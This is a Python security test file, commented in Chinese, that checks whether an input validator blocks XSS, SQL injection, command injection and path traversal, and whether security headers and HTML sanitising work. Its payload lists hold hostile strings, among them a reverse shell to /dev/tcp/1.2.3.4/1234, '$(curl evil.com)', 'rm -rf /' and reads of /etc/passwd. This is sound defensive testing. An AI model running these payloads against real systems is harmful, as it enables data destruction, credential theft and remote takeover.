#!/usr/bin/env python3
"""
安全测试 - 验证XSS/SQL注入/命令注入/路径遍历防护
"""

import sys
sys.path.insert(0, '/workspace')

from src.security.input_validator import InputValidator, ValidationError, SecurityHeaders


def test_xss_protection():
    """测试XSS防护"""
    print("[Security] 测试XSS防护...")

    xss_payloads = [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "javascript:alert('xss')",
        "<iframe src='evil.com'></iframe>",
        "<body onload=alert('xss')>",
        "<input type=hidden onfocus=alert('xss')>",
    ]

    blocked = 0
    for payload in xss_payloads:
        has_xss, reason = InputValidator.contains_xss(payload)
        if has_xss:
            blocked += 1
            print(f"  [BLOCKED] {payload[:50]}... -> {reason}")
        else:
            print(f"  [MISSED] {payload[:50]}...")

    assert blocked >= len(xss_payloads) * 0.8, f"XSS拦截率过低: {blocked}/{len(xss_payloads)}"
    print(f"[Security] XSS防护通过: {blocked}/{len(xss_payloads)} 已拦截")
    return True


def test_sql_injection_protection():
    """测试SQL注入防护"""
    print("[Security] 测试SQL注入防护...")

    sql_payloads = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "1; DELETE FROM users",
        "UNION SELECT * FROM passwords",
        "admin'--",
        "' OR 1=1#",
        "1 AND 1=1",
        "'; EXEC xp_cmdshell('dir') --",
    ]

    blocked = 0
    for payload in sql_payloads:
        has_sql, reason = InputValidator.contains_sql_injection(payload)
        if has_sql:
            blocked += 1
            print(f"  [BLOCKED] {payload[:50]}... -> {reason}")
        else:
            print(f"  [MISSED] {payload[:50]}...")

    assert blocked >= len(sql_payloads) * 0.7, f"SQL注入拦截率过低: {blocked}/{len(sql_payloads)}"
    print(f"[Security] SQL注入防护通过: {blocked}/{len(sql_payloads)} 已拦截")
    return True


def test_command_injection_protection():
    """测试命令注入防护"""
    print("[Security] 测试命令注入防护...")

    cmd_payloads = [
        "; rm -rf /",
        "| cat /etc/passwd",
        "&& whoami",
        "`id`",
        "$(curl evil.com)",
        "; bash -i >& /dev/tcp/1.2.3.4/1234 0>&1",
    ]

    blocked = 0
    for payload in cmd_payloads:
        has_cmd, reason = InputValidator.contains_command_injection(payload)
        if has_cmd:
            blocked += 1
            print(f"  [BLOCKED] {payload[:50]}... -> {reason}")
        else:
            print(f"  [MISSED] {payload[:50]}...")

    assert blocked >= len(cmd_payloads) * 0.6, f"命令注入拦截率过低: {blocked}/{len(cmd_payloads)}"
    print(f"[Security] 命令注入防护通过: {blocked}/{len(cmd_payloads)} 已拦截")
    return True


def test_input_validation():
    """测试输入验证"""
    print("[Security] 测试输入验证...")

    # 正常输入
    assert InputValidator.validate_text("hello", "test") == "hello"
    assert InputValidator.validate_identifier("task_123", "task_id") == "task_123"

    # 空输入
    try:
        InputValidator.validate_text("", "test", allow_empty=False)
        assert False, "应该拒绝空字符串"
    except ValidationError:
        pass

    # 超长输入
    try:
        InputValidator.validate_text("x" * (InputValidator.MAX_TEXT_LENGTH + 1), "test")
        assert False, "应该拒绝超长字符串"
    except ValidationError:
        pass

    # 非法标识符
    try:
        InputValidator.validate_identifier("task;123", "task_id")
        assert False, "应该拒绝非法标识符"
    except ValidationError:
        pass

    # 路径遍历
    try:
        InputValidator.validate_path("../../etc/passwd", "path")
        assert False, "应该拒绝路径遍历"
    except ValidationError:
        pass

    # 邮箱验证
    assert InputValidator.validate_email("test@example.com", "email") == "test@example.com"
    try:
        InputValidator.validate_email("invalid-email", "email")
        assert False, "应该拒绝非法邮箱"
    except ValidationError:
        pass

    print("[Security] 输入验证通过")
    return True


def test_memory_content_security():
    """测试记忆内容安全验证"""
    print("[Security] 测试记忆内容安全验证...")

    # 正常内容
    assert InputValidator.validate_memory_content("这是一个正常的记忆内容") == "这是一个正常的记忆内容"

    # XSS内容
    try:
        InputValidator.validate_memory_content("<script>alert('xss')</script>")
        assert False, "应该拒绝XSS内容"
    except ValidationError:
        pass

    # SQL注入内容
    try:
        InputValidator.validate_memory_content("'; DROP TABLE triples; --")
        assert False, "应该拒绝SQL注入内容"
    except ValidationError:
        pass

    print("[Security] 记忆内容安全验证通过")
    return True


def test_security_headers():
    """测试安全响应头"""
    print("[Security] 测试安全响应头...")

    headers = SecurityHeaders.get_headers()
    assert 'X-Content-Type-Options' in headers
    assert headers['X-Content-Type-Options'] == 'nosniff'
    assert 'X-Frame-Options' in headers
    assert headers['X-Frame-Options'] == 'DENY'
    assert 'Content-Security-Policy' in headers

    print("[Security] 安全响应头通过")
    return True


def test_html_sanitization():
    """测试HTML净化"""
    print("[Security] 测试HTML净化...")

    dirty = "<script>alert('xss')</script><b>bold</b>"
    clean = InputValidator.sanitize_html(dirty)
    assert "<script>" not in clean
    assert "&lt;script&gt;" in clean

    # 允许特定标签
    clean_with_tags = InputValidator.sanitize_html(dirty, allowed_tags={"b"})
    assert "<b>" in clean_with_tags
    assert "<script>" not in clean_with_tags

    print("[Security] HTML净化通过")
    return True


def run_all_security_tests():
    """运行所有安全测试"""
    print("=" * 80)
    print("安全测试开始")
    print("=" * 80)

    tests = [
        test_xss_protection,
        test_sql_injection_protection,
        test_command_injection_protection,
        test_input_validation,
        test_memory_content_security,
        test_security_headers,
        test_html_sanitization,
    ]

    passed = 0
    failed = 0

    for test in tests:
        try:
            if test():
                passed += 1
        except Exception as e:
            failed += 1
            print(f"[Security] 测试失败: {test.__name__}: {e}")

    print("\n" + "=" * 80)
    print(f"安全测试完成: 通过={passed}, 失败={failed}")
    print("=" * 80)

    return failed == 0


if __name__ == "__main__":
    success = run_all_security_tests()
    sys.exit(0 if success else 1)
